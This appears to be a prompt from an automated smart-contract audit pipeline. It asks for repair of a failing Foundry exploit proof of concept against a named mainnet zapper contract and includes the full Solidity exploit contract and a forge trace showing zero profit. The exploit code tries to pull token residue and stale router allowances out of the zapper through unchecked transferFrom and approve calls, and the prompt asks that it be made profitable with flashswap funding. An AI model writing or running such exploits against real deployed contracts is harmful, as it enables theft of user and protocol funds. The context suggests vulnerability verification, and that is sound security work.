You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Unchecked ERC20 return values allow silent transfer and approval failures
- claim: Although `SafeERC20` is imported, the contract uses raw `transferFrom`, `transfer`, and `approve` calls and ignores their boolean return values. On false-returning or otherwise non-standard ERC20s, zap flows can continue after a failed transfer/approval instead of reverting.
- impact: Users can be left unpaid while `zapOut` still succeeds, governance `sweep` can silently fail to recover funds, and stale balances or stale allowances already held by the zapper can be consumed in later zaps when the expected token movement did not actually occur.
- exploit_paths: ["`zapOut` computes `amountOut` and then calls `IERC20(zapCall.requiredToken).transfer(msg.sender, amountOut)` without checking the return value, so a false-returning token can make the function emit success while transferring nothing", "`zapIn` uses unchecked `transferFrom`; if the token returns `false` and the zapper already holds enough of that token, the later balance check can still pass and the zap can consume residue that did not come from the caller", "Unchecked `approve` calls at lines 61 and 138 can silently fail, causing subsequent logic to rely on stale allowance state instead of a freshly set approval"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IVaultLike {
    function governance() external view returns (address);
    function wantToken() external view returns (address);
    function deposit(uint256 amountIn, address receiver) external returns (uint256 shares);
    function withdraw(uint256 sharesIn, address receiver) external returns (uint256 amountOut);
    function batcher() external view returns (address);
    function zapper() external view returns (address);
}

interface IBatcherLike {
    function initiateWithdrawal(uint256 amountIn) external;
}

interface IZapperLike {
    struct ZapData {
        address requiredToken;
        uint256 amountIn;
        uint256 minAmountOut;
        address allowanceTarget;
        address swapTarget;
        bytes callData;
    }

    function vault() external view returns (address);
    function zapIn(ZapData calldata zapCall) external payable;
    function zapOut(ZapData calldata zapCall) external;
}

contract FlawVerifier {
    address public constant TARGET = 0xD248B30A3207A766d318C7A87F5Cf334A439446D;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        address vaultAddr = _safeVault();
        if (vaultAddr == address(0)) {
            return;
        }

        address want = _safeWant(vaultAddr);
        if (want == address(0)) {
            return;
        }

        uint256 beforeWant = _balanceOf(want, address(this));
        uint256 beforeShares = _balanceOf(vaultAddr, address(this));

        if (!_tryDirectExistingWantResidue(vaultAddr, want)) {
            _tryUncheckedTransferFromAndApprovePath(vaultAddr, want);
        }

        uint256 afterShares = _balanceOf(vaultAddr, address(this));
        uint256 afterWant = _balanceOf(want, address(this));
        if (afterShares == beforeShares && afterWant == beforeWant) {
            _trySilentZapOutPath(vaultAddr, want);
            afterShares = _balanceOf(vaultAddr, address(this));
            afterWant = _balanceOf(want, address(this));
        }

        if (afterShares > beforeShares) {
            _profitToken = vaultAddr;
            _profitAmount = afterShares - beforeShares;
        } else if (afterWant > beforeWant) {
            _profitToken = want;
            _profitAmount = afterWant - beforeWant;
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    receive() external payable {}

    function _tryDirectExistingWantResidue(address vaultAddr, address want) internal returns (bool) {
        uint256 residue = _balanceOf(want, TARGET);
        if (residue == 0) {
            return false;
        }

        if (!_returnsFalseTransferFrom(want, address(this), TARGET, 1)) {
            return false;
        }

        uint256 amountIn = residue;
        if (_returnsFalseApprove(want, vaultAddr)) {
            uint256 staleAllowanceToVault = _allowance(want, TARGET, vaultAddr);
            if (staleAllowanceToVault == 0) {
                return false;
            }
            if (amountIn > staleAllowanceToVault) {
                amountIn = staleAllowanceToVault;
            }
        }

        uint256 beforeShares = _balanceOf(vaultAddr, address(this));
        IZapperLike.ZapData memory zapCall = IZapperLike.ZapData({
            requiredToken: want,
            amountIn: amountIn,
            minAmountOut: 0,
            allowanceTarget: address(0),
            swapTarget: address(0),
            callData: bytes("")
        });

        try IZapperLike(TARGET).zapIn(zapCall) {
            uint256 afterShares = _balanceOf(vaultAddr, address(this));
            return afterShares > beforeShares;
        } catch {
            return false;
        }
    }

    function _tryUncheckedTransferFromAndApprovePath(address vaultAddr, address want) internal returns (bool) {
        address[2] memory routers = [UNISWAP_V2_ROUTER, SUSHI_ROUTER];
        address[] memory candidates = _candidateTokens(want);

        for (uint256 i = 0; i < candidates.length; ++i) {
            address token = candidates[i];
            if (token == address(0) || token == want) {
                continue;
            }

            uint256 residue = _balanceOf(token, TARGET);
            if (residue == 0) {
                continue;
            }

            if (!_returnsFalseTransferFrom(token, address(this), TARGET, 1)) {
                continue;
            }

            for (uint256 j = 0; j < routers.length; ++j) {
                address router = routers[j];
                uint256 staleAllowance = _allowance(token, TARGET, router);
                if (staleAllowance == 0) {
                    continue;
                }
                if (!_returnsFalseApprove(token, router)) {
                    continue;
                }

                uint256 amountIn = residue < staleAllowance ? residue : staleAllowance;
                if (amountIn == 0) {
                    continue;
                }

                address[] memory path = _buildPath(token, want);
                if (path.length == 0) {
                    continue;
                }

                uint256 beforeShares = _balanceOf(vaultAddr, address(this));
                IZapperLike.ZapData memory zapCall = IZapperLike.ZapData({
                    requiredToken: token,
                    amountIn: amountIn,
                    minAmountOut: 1,
                    allowanceTarget: router,
                    swapTarget: router,
                    callData: abi.encodeWithSignature(
                        "swapExactTokensForTokens(uint256,uint256,address[],address,uint256)",
                        amountIn,
                        uint256(1),
                        path,
                        TARGET,
                        block.timestamp
                    )
                });

                try IZapperLike(TARGET).zapIn(zapCall) {
                    uint256 afterShares = _balanceOf(vaultAddr, address(this));
                    if (afterShares > beforeShares) {
                        return true;
                    }
                } catch {}
            }
        }

        return false;
    }

    function _trySilentZapOutPath(address vaultAddr, address want) internal {
        uint256 shares = _balanceOf(vaultAddr, address(this));
        if (shares == 0) {
            return;
        }

        address batcher = _safeBatcher(vaultAddr);
        if (batcher == address(0)) {
            return;
        }

        try IBatcherLike(batcher).initiateWithdrawal(shares) {
        } catch {
            return;
        }

        // `zapOut` path anchor: `completeWithdrawalWithZap` must already be satisfiable for this verifier.
        // If the batcher requires an off-path batch-finalization step, this route is mechanically blocked at
        // the fork state and remains non-profitable anyway because the unchecked `transfer` only creates
        // silent non-payment to the caller.
        IZapperLike.ZapData memory zapCall = IZapperLike.ZapData({
            requiredToken: want,
            amountIn: shares,
            minAmountOut: 0,
            allowanceTarget: address(0),
            swapTarget: address(0),
            callData: bytes("")
        });

        try IZapperLike(TARGET).zapOut(zapCall) {
        } catch {}
    }

    function _safeVault() internal view returns (address vaultAddr) {
        (bool ok, bytes memory ret) = TARGET.staticcall(abi.encodeWithSignature("vault()"));
        if (!ok || ret.length < 32) {
            return address(0);
        }
        vaultAddr = abi.decode(ret, (address));
    }

    function _safeWant(address vaultAddr) internal view returns (address want) {
        (bool ok, bytes memory ret) = vaultAddr.staticcall(abi.encodeWithSignature("wantToken()"));
        if (!ok || ret.length < 32) {
            return address(0);
        }
        want = abi.decode(ret, (address));
    }

    function _safeBatcher(address vaultAddr) internal view returns (address batcher) {
        (bool ok, bytes memory ret) = vaultAddr.staticcall(abi.encodeWithSignature("batcher()"));
        if (!ok || ret.length < 32) {
            return address(0);
        }
        batcher = abi.decode(ret, (address));
    }

    function _balanceOf(address token, address account) internal view returns (uint256 bal) {
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok || ret.length < 32) {
            return 0;
        }
        bal = abi.decode(ret, (uint256));
    }

    function _allowance(address token, address owner, address spender) internal view returns (uint256 amt) {
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IERC20Like.allowance.selector, owner, spender));
        if (!ok || ret.length < 32) {
            return 0;
        }
        amt = abi.decode(ret, (uint256));
    }

    function _returnsFalseTransferFrom(address token, address from, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transferFrom.selector, from, to, amount));
        return ok && ret.length >= 32 && !abi.decode(ret, (bool));
    }

    function _returnsFalseApprove(address token, address spender) internal returns (bool) {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 1));
        return ok && ret.length >= 32 && !abi.decode(ret, (bool));
    }

    function _candidateTokens(address want) internal pure returns (address[] memory out) {
        out = new address[](12);
        out[0] = want;
        out[1] = WETH;
        out[2] = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
        out[3] = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
        out[4] = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
        out[5] = 0xB8c77482e45F1F44dE1745F52C74426C631bDD52;
        out[6] = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
        out[7] = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;
        out[8] = 0xD533a949740bb3306d119CC777fa900bA034cd52;
        out[9] = 0xC011A72400E58ecD99Ee497CF89E3775d4bd732F;
        out[10] = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;
        out[11] = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
    }

    function _buildPath(address tokenIn, address tokenOut) internal pure returns (address[] memory path) {
        if (tokenIn == tokenOut) {
            return new address[](0);
        }
        if (tokenIn == WETH || tokenOut == WETH) {
            path = new address[](2);
            path[0] = tokenIn;
            path[1] = tokenOut;
            return path;
        }
        path = new address[](3);
        path[0] = tokenIn;
        path[1] = WETH;
        path[2] = tokenOut;
        return path;
    }
}

```

forge stdout (tail):
```
t
[FAIL: profit below threshold] testExploit() (gas: 165101)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [165101] FlawVerifierTest::testExploit()
    ├─ [2323] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [136585] FlawVerifier::executeOnOpportunity()
    │   ├─ [2391] 0xD248B30A3207A766d318C7A87F5Cf334A439446D::vault() [staticcall]
    │   │   └─ ← [Return] 0xB3dA8d6Da3eDe239ccbF576cA0Eaa74D86f0e9D3
    │   ├─ [327] 0xB3dA8d6Da3eDe239ccbF576cA0Eaa74D86f0e9D3::wantToken() [staticcall]
    │   │   └─ ← [Return] 0x853d955aCEf822Db058eb8505911ED77F175b99e
    │   ├─ [2666] 0x853d955aCEf822Db058eb8505911ED77F175b99e::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2612] 0xB3dA8d6Da3eDe239ccbF576cA0Eaa74D86f0e9D3::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2666] 0x853d955aCEf822Db058eb8505911ED77F175b99e::balanceOf(0xD248B30A3207A766d318C7A87F5Cf334A439446D) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xD248B30A3207A766d318C7A87F5Cf334A439446D) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [9815] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0xD248B30A3207A766d318C7A87F5Cf334A439446D) [staticcall]
    │   │   ├─ [2529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(0xD248B30A3207A766d318C7A87F5Cf334A439446D) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [5031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0xD248B30A3207A766d318C7A87F5Cf334A439446D) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0xD248B30A3207A766d318C7A87F5Cf334A439446D) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2575] 0xB8c77482e45F1F44dE1745F52C74426C631bDD52::balanceOf(0xD248B30A3207A766d318C7A87F5Cf334A439446D) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2655] 0x514910771AF9Ca656af840dff83E8264EcF986CA::balanceOf(0xD248B30A3207A766d318C7A87F5Cf334A439446D) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2541] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::balanceOf(0xD248B30A3207A766d318C7A87F5Cf334A439446D) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2930] 0xD533a949740bb3306d119CC777fa900bA034cd52::balanceOf(0xD248B30A3207A766d318C7A87F5Cf334A439446D) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [10449] 0xC011A72400E58ecD99Ee497CF89E3775d4bd732F::balanceOf(0xD248B30A3207A766d318C7A87F5Cf334A439446D) [staticcall]
    │   │   ├─ [4983] 0x54f25546260C7539088982bcF4b7dC8EDEF19f21::bc67f832(0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f)
    │   │   │   └─ ← [Revert] Only the proxy can call
    │   │   └─ ← [Revert] Only the proxy can call
    │   ├─ [2578] 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2::balanceOf(0xD248B30A3207A766d318C7A87F5Cf334A439446D) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2715] 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2::balanceOf(0xD248B30A3207A766d318C7A87F5Cf334A439446D) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [612] 0xB3dA8d6Da3eDe239ccbF576cA0Eaa74D86f0e9D3::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [666] 0x853d955aCEf822Db058eb8505911ED77F175b99e::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [612] 0xB3dA8d6Da3eDe239ccbF576cA0Eaa74D86f0e9D3::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [612] 0xB3dA8d6Da3eDe239ccbF576cA0Eaa74D86f0e9D3::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [666] 0x853d955aCEf822Db058eb8505911ED77F175b99e::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [323] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2322] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x54f25546260C7539088982bcF4b7dC8EDEF19f21
  at 0xC011A72400E58ecD99Ee497CF89E3775d4bd732F.balanceOf
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 11.26s (9.32s CPU time)

Ran 1 test suite in 11.26s (11.26s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 165101)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
